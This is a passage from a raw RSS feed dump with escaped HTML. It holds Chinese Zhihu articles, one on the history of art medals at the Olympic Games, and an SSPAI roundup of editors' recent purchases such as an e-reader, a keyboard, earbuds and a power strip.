src=\"https://pic1.zhimg.com/v2-cbf965782065bc781bc2f655b2a95ab7_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-cbf965782065bc781bc2f655b2a95ab7\" data-watermark-src=\"v2-0d5a9b7de29293b5e3807e3741a9bbf8\" data-private-watermark-src=\"v2-d83c9587d4b538306efb20b796130bc3\"></p>\n<p>这次硬件销量同比缩水，爆杀古川，该来点大的了吧！（但其实是去年动森太猛了，恐怕古川还要继续躺……）</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/question/266492999/answer/309613424?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\">匿名用户</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/266492999/answer/309613424?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">185 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/297478327?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价switch2019年推出的升级版？</a><br><a href=\"http://www.zhihu.com/question/286061729?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">年龄大了玩 Switch 什么感受？</a><br>\n","link":"http://www.zhihu.com/question/266492999/answer/309613424?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如果艺术家也能角逐奥运金牌……","date":"2021-08-05 09:34:13","description":"\n<p>1908年奥运会，沃尔特·威南斯代表美国队出赛，赢得了射击项目金牌。他在1912年又一次参加奥运会，并且除射击之外，还参加了另一个项目，并赢得金牌。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-4bd68a2985b71c5478c830a107ea4d9c_b.jpg\" data-size=\"normal\" data-rawwidth=\"2048\" data-rawheight=\"1532\" class=\"origin_image zh-lightbox-thumb\" width=\"2048\" data-original=\"https://pic1.zhimg.com/v2-4bd68a2985b71c5478c830a107ea4d9c_r.jpg\"><figcaption>沃尔特·威南斯</figcaption></figure><p>问：沃尔特·威南斯参加的是什么项目？</p>\n<ul>\n<li>A，马术</li>\n<li>B，游泳</li>\n<li>C，唱歌</li>\n<li>D，雕塑</li>\n</ul>\n<p>要是按照以往做选择题的经验，我们肯定先排除两个明显和题干奥运会无关的选项唱歌和雕塑，然后再考虑，射击、游泳和马术都包含在现代五项里面，不太好选，但看照片这位老人家颇有一幅西部片里面警长的样子，肯定会骑马，不一定会游泳，所以答案应该是A，马术？</p>\n<p>很遗憾，答案是D。他的金牌的确和马有关，但并不是马术，而是……一件青铜雕塑——《美国快步马》。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-6e44049c1415a841c8b07be4c6f9e3b5_b.jpg\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"1920\" data-original=\"https://pic2.zhimg.com/v2-6e44049c1415a841c8b07be4c6f9e3b5_r.jpg\"><figcaption>沃尔特·威南斯，《美国快步马》</figcaption></figure><p>是的，当年的奥运会，曾经是比雕塑的。而且不光有雕塑，还有绘画、建筑、音乐和文学，一比就是几十年。</p>\n<p>在奥运会搞艺术大奖赛这事儿确实不是瞎折腾，而是现代奥林匹克运动会的创始人皮埃尔·德·顾拜旦的主意。早在1894年头一回奥运会之后，顾拜旦就觉得不过瘾，不够劲儿。他觉得世界大同光靠体育的交流还是不够，还需要有心灵的交流，心灵交流就要靠艺术。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-f129afa6e23db35f40989472ba6491e6_b.jpg\" data-size=\"normal\" data-rawwidth=\"684\" data-rawheight=\"965\" class=\"origin_image zh-lightbox-thumb\" width=\"684\" data-original=\"https://pic3.zhimg.com/v2-f129afa6e23db35f40989472ba6491e6_r.jpg\"><figcaption>顾拜旦男爵皮埃尔·德·弗雷迪</figcaption></figure><figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-2af535af5806ccb2a9015d0416781315_b.jpg\" data-size=\"normal\" data-rawwidth=\"684\" data-rawheight=\"767\" class=\"origin_image zh-lightbox-thumb\" width=\"684\" data-original=\"https://pic2.zhimg.com/v2-2af535af5806ccb2a9015d0416781315_r.jpg\"><figcaption>顾拜旦的《奥林匹克宣言》手稿于2019年经苏富比拍卖，以6160万元成交。</figcaption></figure><p>于是，当1912年斯德哥尔摩承办奥运会的时候，顾拜旦就说，咱那些体育项目：田径、体操、帆船、马术……照常比，再加几条艺术的呗。斯德哥尔摩一开始是很不情愿的，但是最终还是同意增设绘画、雕塑、建筑、音乐、文学五个领域，各设金银铜牌。舞蹈、电影和摄影等形式一度也被纳入考量范围，但最终没有被采纳。参赛作品的体裁不限，但有一个要求——必须呼应体育运动主题和奥林匹克精神。</p>\n<p>这就有了前面咱们说的双料冠军沃尔特·威南斯，一个人赢下射击和雕塑两项金牌的逸事了。不过，老实说咱们这位奥运金牌得主并不是特别有名的艺术家，他的雕塑作品也是中规中矩。之所以他赢得金牌，其实也是矮子里面拔高个，第一届有艺术赛事的奥运会，五个项目加起来，才总共只有35人报名参加，按最终颁发15枚奖牌计算，等于每两个半人就能匀到一枚奖牌，竞争激烈程度比跑步、跳高可是低多了。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-469b0713b53bb1afcd9a2eb475b54325_b.jpg\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"1082\" class=\"origin_image zh-lightbox-thumb\" width=\"800\" data-original=\"https://pic2.zhimg.com/v2-469b0713b53bb1afcd9a2eb475b54325_r.jpg\"><figcaption>1912年斯德哥尔摩奥运会海报，图画作者为奥洛夫·霍茲伯格，他的这幅画并没有参赛获奖</figcaption></figure><p>虽说一开始艺术赛事的热度不高，但顾拜旦并不打算就此打住。在接下来的几十年里，艺术赛事的参与度逐年增高，到1924年的时候，已经有193位各界艺术家参赛了，而竞赛项目也开始细分，绘画分出了油画、水彩素描、版画；建筑奖项分成两项：建筑和城市规划。只不过这两个类别有时候实在很难区分，有时候干脆会把这两个奖颁给同一个建筑作品。</p>\n<p>文学分出了戏剧、史诗和诗歌——这项赛事的参赛者必须使用英语或者法语参赛。有意思的是，咱们的顾拜旦爵爷为了炒高比赛热度，还曾使用化名乔治·欧罗德和马丁·艾芬巴赫参加诗歌项目赛事，最后乔治·欧罗德还真的赢了一枚金牌。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-a6a828dfff444c76015fdc9e646560bc_b.jpg\" data-size=\"normal\" data-rawwidth=\"320\" data-rawheight=\"320\" class=\"content_image\" width=\"320\"><figcaption>1924年巴黎奥运会金牌，可以看到左下角包含有竖琴等和艺术有关的元素</figcaption></figure><p>音乐赛事虽然分出了管弦乐、独奏和人声，但其实这些作品都是以乐谱的形式递交给组委会的，并不是像今天的选秀节目那样由乐手现场表演给评委。尽管评委们并非等闲之辈——音乐赛事评委中包括有伊戈尔·斯特拉文斯基这样的乐坛传奇，文学评委包括诺贝尔文学奖得主塞尔玛·拉格洛夫等，但在面对这「一页页」奥运选手时，评委们难免因艺术主张的分歧而难以达成共识。事实上，斯特拉文斯基担任音乐赛事评委的1924年奥运会根本没有颁发任何音乐奖牌。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-f02397d5e205aebfd5dc3af966ec2294_b.jpg\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"967\" class=\"origin_image zh-lightbox-thumb\" width=\"800\" data-original=\"https://pic1.zhimg.com/v2-f02397d5e205aebfd5dc3af966ec2294_r.jpg\"><figcaption>斯特拉文斯基的作品如《火鸟》、《春之祭》至今仍会在奥运会花样滑冰等赛事的配乐中出现</figcaption></figure><p>当然，颁不出奖一个原因可能是评委的标准高，另一个原因也是因为很多名声在外的艺术大师不太愿意参赛。这一时期咱们能叫得出名字的那些艺术家，比如毕加索、马蒂斯……全都没参加奥运会。一些艺术家不愿意和其他自己看不上的艺术家同台竞技，另有些艺术家不太愿意迎合奥运会的套路去命题作文——很多参加绘画赛事的艺术家为了能够吸引评委的眼球，都会选择绘制紧张刺激的拳击、橄榄球等主题作品。历史上唯一一位两届奥运会绘画金牌得主让·雅可比的得奖作品便是描绘足球运动中前锋和守门员争球的《角球》和橄榄球运动员激烈拼抢的《橄榄球》。它们为他分别赢得了一枚综合绘画金牌和素描金牌。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-277013288ed3e3fed98dc50cd88eda8a_b.jpg\" data-size=\"normal\" data-rawwidth=\"448\" data-rawheight=\"700\" class=\"origin_image zh-lightbox-thumb\" width=\"448\" data-original=\"https://pic3.zhimg.com/v2-277013288ed3e3fed98dc50cd88eda8a_r.jpg\"><figcaption>让·雅可比，《角球》</figcaption></figure><p>因为上述种种原因，参加奥运会的艺术家们，与其说是艺术家，不如说是「符合奥运精神的资深艺术爱好者」。毕竟，早年间的奥运会非常强调「奥运精神第一，比赛成绩第二」，职业艺术家多仰赖销售作品为生，而奥运会又不想参赛者和钱挂钩，尤其是不想看到赢了金牌的艺术家作品价格变贵。所以当激进的保守派奥委会主席艾弗里·布伦戴奇上任后，他坚持要维护奥运会的纯洁，并力主将全部艺术赛事一次性开除出了奥运会——即便他自己也曾在1932年参与了奥运文学奖的赛事（并没有获得奖牌）。从那以后，这些艺术赛事就再也没有回归奥运大家庭。</p>\n<p>从1912年到1948年的7届奥运会中，总共有23个国家的艺术家赢得了总计147枚奖牌，其中获奖最少的国家是摩纳哥，1枚铜牌，意大利和法国这两个文化大国在金牌榜和总奖牌榜上均并列第二，分别是5枚金牌和14枚奖牌。最终赢得7届奥运会艺术项目金牌和奖牌最多的并不是如今奥运会的大热门中国、美国和俄罗斯，而是德国，他们总共赢得了7金、7银、9铜，总计23枚奖牌。在最后一届包含艺术奖项的奥运会，1948年伦敦奥运会上，英国版画家约翰·科普利以73岁高龄赢得了版画银牌，成为了奥运史上年龄最大的奖牌获得者。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-faefbcfeffcc484783efc4ba80f547cc_b.jpg\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"850\" class=\"origin_image zh-lightbox-thumb\" width=\"1280\" data-original=\"https://pic1.zhimg.com/v2-faefbcfeffcc484783efc4ba80f547cc_r.jpg\"><figcaption>蔡国强主持创作的「大脚印」是08奥运开幕式最早敲定下来的方案之一</figcaption></figure><p>奥运艺术赛事虽然就此打住了，却以另一种形式延续了下来，那就是花样翻新的开幕式和闭幕式。单就在北京举办的2008年夏季奥运会的开幕式来说，就是众多资深艺术工作者合力的成果。除了广为人知的总导演张艺谋，副导演张继钢、陈维亚管的是各种繁杂的事情。樊跃、王潮歌的大型空间演出经验丰富，蔡国强（大脚印焰火），陈丹青（滚动画轴），陈岩和韩立勋（美术总设计）、陈其钢（音乐）……等等。</p>\n<p>去年年底我在故宫看了蔡国强的个展「远行与归来」，里面有他以故宫收藏的《冰嬉图》为灵感创作的《银河嬉冰》，他也会继续为2022年冬奥会出工出力。或许咱可以借此想象，如果现在的奥运会还有艺术赛事，艺术家们会带来什么样的作品。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-f703869f85101a7c16748dde2876f4f0_b.jpg\" data-size=\"normal\" data-rawwidth=\"4032\" data-rawheight=\"2520\" class=\"origin_image zh-lightbox-thumb\" width=\"4032\" data-original=\"https://pic1.zhimg.com/v2-f703869f85101a7c16748dde2876f4f0_r.jpg\"><figcaption>蔡国强的《银河嬉冰》</figcaption></figure><figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-4d6f0abd0bf5851033560660f9579bdf_b.jpg\" data-size=\"normal\" data-rawwidth=\"512\" data-rawheight=\"342\" class=\"origin_image zh-lightbox-thumb\" width=\"512\" data-original=\"https://pic4.zhimg.com/v2-4d6f0abd0bf5851033560660f9579bdf_r.jpg\"><figcaption>《银河嬉冰》局部</figcaption></figure><p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/weng-xin-79?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">翁昕</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br>\n","link":"http://zhuanlan.zhihu.com/p/396372387?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"新玩意 073｜少数派的编辑们最近买了啥？","date":"2021-08-05 09:32:52","description":"\n<h4>关于栏目</h4>\n<p>很多读者都会好奇少数派的编辑们到底平时都「买了啥」。我们希望通过「编辑部的新玩意」介绍编辑部成员们最近在用的新奇产品，让他们自己来谈谈这些新玩意的使用体验究竟如何。</p>\n<hr>\n<h2>@张奕源 Nick：得到阅读器 Pro</h2>\n<ul>\n<li>入手渠道：京东自购</li>\n<li>参考价格：2199 元</li>\n</ul>\n<p>除了 TWS 耳机，其实我电子书也没少买（但书却没读几本）。刚好最近我有一些书和材料要读，手头的旗舰级阅读器 Kindle Oasis 的电池已经严重老化，所以就考虑搞个新的。得到阅读器我关注已久，于是趁着这个机会下了单。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c45p49tb34t8oic3r47g.jpeg\"></figure><p>我这次对于电子书的需求点其实很明确：要有足够大的萤幕尺寸，便于阅览 PDF；要有开放的系统，最好能安装第三方应用，便于阅读各种格式的书籍；最好能支援手写，便于我阅读时划线做笔记。以上三点，得到阅读器 Pro 恰好都具备，价格也在我的预期之内，所以就买了它。</p>\n<p>得到阅读器 Pro 是和文石合作生产的，恰巧我之前用过一段时间公司的一个旧款文石阅读器，体验不算好。但得到阅读器 Pro 的使用感受却和老款文石截然不同，反应速度很快，显示和操作逻辑也都清楚了不少。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c45p4a5b34t8oam7hrig.jpeg\"></figure><p>我稍微研究了一下，得到阅读器 Pro 的原型应该是文石 Nova3，并在此基础上多了一套得到阅读的专属书架和定制 UI。我此前在得到上也买了一些书，刚好可以一并读了，加上阅读器还附赠一年的得到电子书会员，比直接买文石 Nova3 划算许多。当然，由于产品原型来自文石，所以得到阅读器 Pro 的阅读功能已经非常成熟，排版设置、PDF 解析和裁边、全局手写笔记等都不在话下。</p>\n<p>值得一提的是得到阅读器 Pro 的保护壳。这款外壳需要额外购买，装上之后可以为阅读器提供额外的侧面翻页按键，我就是冲着这个按键才购买了这款保护壳。翻页按键能让阅读时的翻书动作更简单，不用再去点按萤幕，而且多出的空间也能安放拇指，使握持更舒适。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c45p4adb34t8o8vq45e0.jpeg\"></figure><p>不过，由于这款电子书搭载的是 Android 系统，在获得扩展性的同时也牺牲了一定的续航，天天看书的话大约用个三五天就要充电一次，虽然算不上频繁，但跟半个月到一个月才需要充一次的 Kindle 相比还是有着明显区别，需要稍微留意一下电量。</p>\n<p>此外，得到还推出了一款得到阅读器 Max，产品原型应该是文石 Note Air。Pro 和 Max 在 SoC 及系统配置上的差别不大，这篇体验也可以作为参考：</p>\n<ul><li>关联阅读：《<a href=\"https://sspai.com/post/66487\" target=\"_blank\">走向精装的电纸书：得到阅读器 Max 上手体验</a>》</li></ul>\n<h2>@北鸮：Skog-Reboot by Percent Studio 机械键盘套件</h2>\n<ul>\n<li>入手价格：2700 元</li>\n<li>入手渠道：二手购入</li>\n</ul>\n<p>客制化键盘圈有一个我觉得还挺不好的习惯：先款团购。虽然理论上和预购其他商品也没什么区别，但由于设计复杂程度、制作工艺、体量、工厂水平、开团方管理能力等等的差距，客制化键盘、键帽甚至轴体的团购都经常延期。对于爱好者来说，等待的时间令人兴奋，但更多的是带来折磨。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/08/05/6e1aec2416cb4a14fcab547578411040.png\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/08/05/9a314843ec058cb9f35a51fdd6fb4e6b.png\" alt=\"\"></figure><p>这把 Skog-Reboot 其实是开团时我就相中的套件。一方面，我非常喜欢 Percent Studio 的设计，他们之前设计的 Canoe 系列套件也是在国内外广受好评；另一方面，我一直想搞一把大的：80% 配列，WKL 大门牙，铝坨坨外壳，最好还是省事的热插拔。但很可惜，当时我并没有什么闲钱，只能加了群，看它开团再看它截团。万万没想到，因为种种原因，Skog-Reboot 的实物键盘表现似乎不如团购预期，全新未拆的热插拔蓝牙双模版本在二手市场的价格跌到了焊接单模的价格。突然有了闲钱的我一个冲动就去收了一把 Space Cadet 配色的现货回来。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c45p4btb34t8po8490sg.jpeg\"></figure><p>由于先前种种评论的预防针，我对 Skog-Reboot 的声音和手感表现本来也没什么期待，我只当那个缓冲结构不存在，买了一把刚性结构的键盘就好。不过上手组装使用之后，我发现这把键盘的打击手感也没有那么不堪，虽然没有那么软弹但也不至于像是敲钢板，更大的问题可能出在打字音没有其他经典的 Gasket 结构键盘那么干净柔和上。我的解决办法非常简单粗暴：给它配上手里本身沙沙声就最大的线性轴 Kailh Novelkeys Cream，我完全放弃声音不就得了吗？（毕竟我<s>那么多键盘</s>写东西还戴耳机。）</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/9f584440b2376c8797dba966c0250d5d.png\"></figure><p>用了一两周下来，这把键盘的外观和手感都完全满足我的要求。虽然这两千多块花得我后知后觉地心疼，但这把键盘的做工和设计也算是对得起这个价格，成功推动我在脱坑的路上迈出了一大步。接下来就是看看手里的其他键盘要卖掉哪个的时候了……</p>\n<h2>@张奕源 Nick：OnePlus Buds Pro</h2>\n<ul>\n<li>入手渠道：厂商赠送</li>\n<li>参考价格：799 元</li>\n</ul>\n<p>本「TWS 大户」又来搞耳机了，这次是 OnePlus Buds Pro。</p>\n<p>在产品发布之前，张老板把这款耳机的定位拔得很高，所以我也一直在等着产品正式开售。没想到我派在保密阶段就提前拿到了产品，也就给了我更多时间来体验一下这款一加在 TWS 领域的旗舰之作。</p>\n<p>OnePlus Buds Pro 的外观很有特点，我在拿到的第一时间就觉得很像方形的糖盒。不过，它的实际手感跟轻飘飘的糖盒完全不同，略有点沉甸甸的，很有分量。耳机从外到内都采用了以类肤质为主的材质，握柄部分则为银色哑光，形成了一种奇妙的撞色。在近期我用过的 TWS 耳机里，OnePlus Buds Pro 的综合性能虽然未必位列第一，但外观上肯定是最独特的一个。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c45p495b34t8o8vq45dg.jpeg\"></figure><p>OnePlus Buds Pro 既然定位旗舰，各项软硬体配置也自然「给满」，从 40 dB 深度降噪到 LHDC 音质，再到通话降噪和长续航，乃至无线充电与杜比全景声——当下能在主流 TWS 耳机上见到的配置，OnePlus Buds Pro 一应俱全。</p>\n<p>我的主要关注点在于这款耳机的降噪能力，重点测试场景则是地铁。根据我使用 TWS 耳机的经验，「能否通过地铁这关」直接决定了一款降噪耳机的实际可用度。和飞机发动机频段稳定、发声持续的噪音不同，地铁里的噪音更为复杂——既有车辆运行本身产生的震动声，也有高速通过某些路段时摩擦铁轨产生的高频声，还有人挤人产生的纷乱和嘈杂声。经过我的实测，OnePlus Buds Pro 在地铁里降噪效果非常不错，听播客也不需要开到很大的声音（甚至进出地铁前后都不用改变音量大小），能让收听体验保持在很舒适的状态。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c45p49db34t8po8490s0.jpeg\"></figure><p>后来我研究了一下，发现除了 OnePlus Buds Pro 本身的降噪算法不错之外，这款耳机在造型上也跟我的耳道很契合，加上类肤材质也很贴合皮肤，佩戴之后耳机可以紧紧「吸」在我的耳中，从物理上就隔绝了不少噪音，进而提升了整体的降噪效果。但其类肤质的设计也有个缺点——耳机本身很容易残留汗和油渍，每次摘下之后都需要先擦一擦才能放进盒子里，导致我用的时候总有点小心翼翼。</p>\n<p>在一加手机用上 ColorOS 之后，一加的耳机也直接使用了 OPPO 的 HeyMelody 应用来进行管理。我因为之前在用 OPPO 耳机，倒也因此不必再多下一个 app，还挺省事。HeyMelody 可以调整耳机的各项参数，具体玩法已经在 <a href=\"https://sspai.com/post/67090\" target=\"_blank\">这篇文章</a> 里写过，这里我就不赘述了。</p>\n<p>总体来说，OnePlus Buds Pro 很适合还没入坑 TWS 的朋友作为自己的入门产品，它从配置到性能都是旗舰级别，799 元的价格也差不多是这一代 TWS 旗舰的均线，入手之后能踏实用个两三年。</p>\n<h2>@包包呀嘿：COSTAR <strong>天生一对·圆满项链</strong>\n</h2>\n<ul>\n<li>入手价格：月亮 / 太阳单件最低 ￥323 到手，情侣款最低 ¥515 到手</li>\n<li>入手渠道：<a href=\"https://item.taobao.com/item.htm?ft=t&amp;id=651757789077\" target=\"_blank\">少数派商店</a>\n</li>\n</ul>\n<p>马上就要七夕了，有没有提前做好准备？我自己的计划是送一件有心意又独一无二的礼物🎁，不用太实用，毕竟在这个浪漫的日子应该去制造一些有情调的仪式感，送饰品是再好不过了，至于送什么，我想一对美丽的情侣项链总不会错吧。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c45p4dlb34t8po8490t0.jpeg\"></figure><p>COSTAR 刚刚发布了新款，天生一对 · 圆满项链，就很符合我送礼物的思路。它选用了深海新西兰 4A 级鲍鱼贝，每一片都是独一无二、浑然天成的天然纹理。做成一对项链，一半是日，一半是月。拼在一起还是一个完整的圆，象征着圆满。日月的搭配，正如这对项链的名字一样，天生一对。日月长久，时光永在。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c45p4e5b34t8oic3r48g.jpeg\"></figure><p>它的包装也很走心，包装的从两侧拉开，日月项链在枝叶的掩映下出现，仿佛打开了一个小花园，是具有仪式感的小惊喜，非常适合作为礼物赠送，可以想像到对方打开信封的瞬间，露出惊喜的眼神，会很有成就感吧。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c45p4elb34t8oam7hrjg.gif\"><figcaption>来自官方图</figcaption></figure><p>天然贝壳的纹理，确实有一种神秘和迷人的感觉，梦幻的极光色，从碧绿到宝蓝，在光的加持下，反射出不同的色彩，美丽💅。极简的造型更能衬托出它的纯粹，也容易搭配。无论休闲的白 T 还是美丽的小裙子都能搭配在一起。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/dff1aabd7556d3f94e12edbf2990a191.jpg\"><figcaption>实拍</figcaption></figure><p>送给心爱的人，也送给自己，是一个很好的选择，既能见证彼此的感情，又有得到新礼物的喜悦，是一个富有小心机的浪漫。它没有过多的装饰，不浮夸，也不跳脱，还能纪念彼此的心意，果然饰品是富有仪式感和纪念意义的存在。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/2f5089ffef919b67c21e735a020937a1.jpg\"><figcaption>实拍</figcaption></figure><p>另外，它的链条也很有细节，有三个延长的扣圈，长度可以自由调节。不过对比起来，月链比较长，日链短一些，当然吊坠也可以拆下来互换链条。</p>\n<p>如果是当作项链佩戴的话，短链更适合优雅的风格，戴在锁骨附近，和皮肤搭配起来也很美丽，不愧是年轻的 body😳。相比之下，长链更适合和衣服一起搭配。穿个简单的 T恤，经典白T或者格纹衬衫，当作搭配的装饰也非常合适。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/0725604d02734dcdeb98c89817e1db11.jpg\"><figcaption>来自官方图</figcaption></figure><p>抛开它是一对项链的定位，也可以把它就当作日常的饰品，不是送给另一半，而是送给自己，七夕多爱自己也没什么错吧🌚？你可以选择两条一起叠戴，日月都在自己身上，可能会有一种拥有整个宇宙的错觉，听起来也是一个不错的 idea 呢。链条在手腕上多绕几圈，还可以变成手链，我自己的感觉是日链更小巧，比较适合女孩子的手腕，不过一起都在手腕上叠戴也不成问题。</p>\n<p>饰品这种注重细节和搭配的物品，总能包容大家的各种小心思，想怎么搭配都可以跟随自己的想法，COSTAR 的这对项链绝对称得上随心百搭。</p>\n<h2>@Clyde：摩斯维小米 11 Pro 无边框手机壳</h2>\n<ul>\n<li>入手价格：35.9 元</li>\n<li>入手渠道：京东自营旗舰店</li>\n</ul>\n<p>如果不考虑 iPhone，为了国内生活便利再怎么也得准备一台搭载 MIUI 的小米手机。在线下实际上手过一次小米 11 Pro 之后，感叹其相比手中的 <a href=\"https://sspai.com/post/67291\" target=\"_blank\">Redmi K40 Pro+</a> 甚至此前的 <a href=\"https://sspai.com/post/64817\" target=\"_blank\">小米 11</a> 在质感上的巨大进步，因此很快也将 MIUI 备机升级到了小米 11 Pro。</p>\n<p>不过我早就说过，我对小米 11 全系的后置摄像头设计都非常难以接受；在「手机要不要带壳使用」这个问题上，我一直以来也都相信那句至理名言 —— Better safe than sorry，小米 11 Pro 并不是一台便宜的备机，好好保养，小米 MIX 4 出了之后没准还能卖个好价。</p>\n<p>综合考虑，是时候给小米 11 Pro 挑个手机壳了。在阿里巴巴、淘宝和京东逛了一圈，最后我还是选择了此前在小米 10 上选择过的摩斯维。</p>\n<p>摩斯维这款手机壳后盖采用了磨砂设计，手感舒适的同时搭配灰、黑配色机身非常好看 —— 实际上去年正好也是在小米之家看到店员在搭配小米 10 国风雅灰用这款壳，当时正被小米出厂清水壳恶心到不行的我才立马打听到了这款手机壳的品牌。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c45p4gtb34t8oic3r490.jpeg\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c45p4hdb34t8o8vq45fg.jpeg\" alt=\"\"></figure><p>所以小米 11 Pro 黑色版本搭配这款壳观感也不差：黑色版本不带壳状态下镜面后盖光彩照人但非常容易收集指纹，套壳之后不仅增加了手感，还保留了几分机身镜面后盖的朦胧观感。</p>\n<p>除了好看，摩斯维这款手机壳让我在经历好几款小米手机之后依然复购的最重要原因，则是它所谓的「无边框设计」。一般而言手机壳都会为原本就已经非常大的手机增加额外宽度，@路中南 据说非常受不了这一点。摩斯维的做法是将机身两侧手机壳的部分「砍掉」，只保留上下和四角。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c45p4htb34t8oam7hrl0.jpeg\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c45p4idb34t8oic3r49g.jpeg\" alt=\"\"></figure><p>不得不说还是非常佩服一开始想出这种创意的人——对小米 11 Pro 这种曲面大屏手机来说，这种设计既能保证带壳之后不增加横向宽度，又能完整保留曲面部分原有的顺滑手感；保证边角包裹的同时，在手机壳主要保护的跌落损坏区域中牺牲了不那么关键的部分，太妙了。</p>\n<h2>@HarveyJanson：公牛 65W PD 快充插座 </h2>\n<ul>\n<li>入手渠道：京东自购</li>\n<li>入手价格：¥154（¥159 - ¥5），7/1 – 7/31 京东只要 ¥144</li>\n</ul>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/03/5c1f560f94687714fbb878aa73762c81.jpeg\"></figure><p>之前用公牛自带收纳盒的插座，结果遇到了几个问题。首先是开关莫名其妙卡住了，位置也扭曲了，导致插排彻底关不上了。其次是去年年中购入了港版 Switch，自带收纳盒的高度不够高，装不下 Switch 插头加转换器，使得盖子形同虚设。第三是孔位不够富裕，虽然有专门插 MacBook Pro 大砖头的侧面孔位，但刨去三个 USB 口，就只有五个五头插座，笔记本、显示器、Switch、PS5 插满后就只剩一个口机动，如果插头形制特殊，甚至连这最后一个孔也没了（之前接宜家的三充电位无线充电器就是这情况）。</p>\n<p>年初的时候换了 M1 MacBook Air，事实上已经不需要 87W 的充电功率了。不用纠结「大白砖头」，可供选择的插排也一下多了起来。后来偶然看到公牛出了这款带 65W PD 充电口的插排，孔位有比较合理，就直接下单了。当然，下单之前我也规划了一下各个插口的布置，大致如下：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_harveyjanson/16253197364984.jpeg\" alt=\"\"></figure><p>当然，这都是理想化的布局。受制于个别插头的体积（说的就是港版 Switch 加转换器那个巨大无比的插头），实际布局做了微调如下：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_harveyjanson/16253197366246.jpeg\" alt=\"因为没了自带收纳盒，就上网买了个这个，开口够多，就是都不大\"><figcaption>因为没了自带收纳盒，就上网买了个这个，开口够多，就是都不大</figcaption></figure><p>换这个插排的好处显而易见：由于 MacBook 充电不再占用一个插座，后备插座的数量增加了，能更好地应对弹性需求。由于我个人同时需要接电的设备终归是有限的，这个配置在相当长一段时间里应该都够用，哪怕换了电动升降桌，也有富余。</p>\n<p>要说缺点的话，其实就一条：除了 65W 充电口之外，两个 USB-A 